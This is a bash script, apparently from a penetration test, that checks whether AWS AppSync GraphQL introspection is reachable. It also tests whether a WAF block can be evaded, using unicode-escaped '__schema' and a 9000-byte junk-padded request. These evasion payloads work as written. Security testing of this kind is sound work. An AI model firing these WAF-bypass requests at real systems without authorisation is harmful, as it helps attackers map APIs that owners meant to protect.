#!/usr/bin/env bash
# appsync-introspection.sh — confirm AppSync GraphQL introspection is reachable AND, if a WAF
# "blocks" it, that the block is bypassable (REF-PENTEST #2). AppSync can't disable introspection
# at the API layer, so a WAF string-match is the only control — and string-match is evadable.
#
# Tries: (1) plain introspection, (2) the field name with a JSON \u unicode-escape (decodes to the
# same query but dodges a raw-byte WAF match), (3) introspection padded with a large junk field to
# push the keyword past the WAF's byte-inspection window. A schema in ANY response = exposed.
#
# Env: APPSYNC_URL=https://xxxx.appsync-api.<region>.amazonaws.com/graphql
#      APPSYNC_API_KEY=da2-... (or AUTH_HEADER='Authorization: <jwt>'). TEST instance only.
set -uo pipefail
cd "$(dirname "$0")"
URL="${APPSYNC_URL:-FILL_ME}"
[ "${URL#FILL}" != "$URL" ] && { echo "Set APPSYNC_URL=https://<id>.appsync-api.<region>.amazonaws.com/graphql"; exit 2; }
HDR=()
[ -n "${APPSYNC_API_KEY:-}" ] && HDR=(-H "x-api-key: $APPSYNC_API_KEY")
[ -n "${AUTH_HEADER:-}" ] && HDR+=(-H "$AUTH_HEADER")

PLAIN='{"query":"query{__schema{types{name}}}"}'
# "__schema" with the two leading underscores \u-escaped: the server JSON-decodes _ → "_" so the
# query is identical, but the raw request bytes no longer contain the literal "__schema" a WAF matches.
ESCAPED="$(python3 -c "q=chr(34); bs=chr(92); print('{'+q+'query'+q+':'+q+'query{'+bs+'u005f'+bs+'u005fschema{types{name}}}'+q+'}')")"
JUNK="$(python3 -c "print('{\"query\":\"query{__schema{types{name}}}\",\"variables\":{\"pad\":\"'+'A'*9000+'\"}}')")"

try() {
  local label="$1" data="$2"
  local resp; resp=$(curl -s -m 10 -X POST "$URL" "${HDR[@]}" -H 'content-type: application/json' -d "$data" 2>&1 || true)
  if printf '%s' "$resp" | grep -q '"__schema"\|"types"\|"queryType"'; then
    printf '  FAIL  %-18s → introspection RETURNED THE SCHEMA\n' "$label"; return 1
  elif printf '%s' "$resp" | grep -qi 'forbidden\|waf\|blocked\|403'; then
    printf '  ok    %-18s → blocked\n' "$label"; return 0
  else
    printf '  ?     %-18s → %s\n' "$label" "$(printf '%s' "$resp" | head -c 80)"; return 0
  fi
}
fails=0
try "plain"            "$PLAIN"   || fails=$((fails+1))
try "unicode-escape"   "$ESCAPED" || fails=$((fails+1))
try "junk-byte-pad"    "$JUNK"    || fails=$((fails+1))
echo "summary: $fails introspection vector(s) returned the schema (WAF ineffective if the escaped/junk variant won)"
exit "$fails"
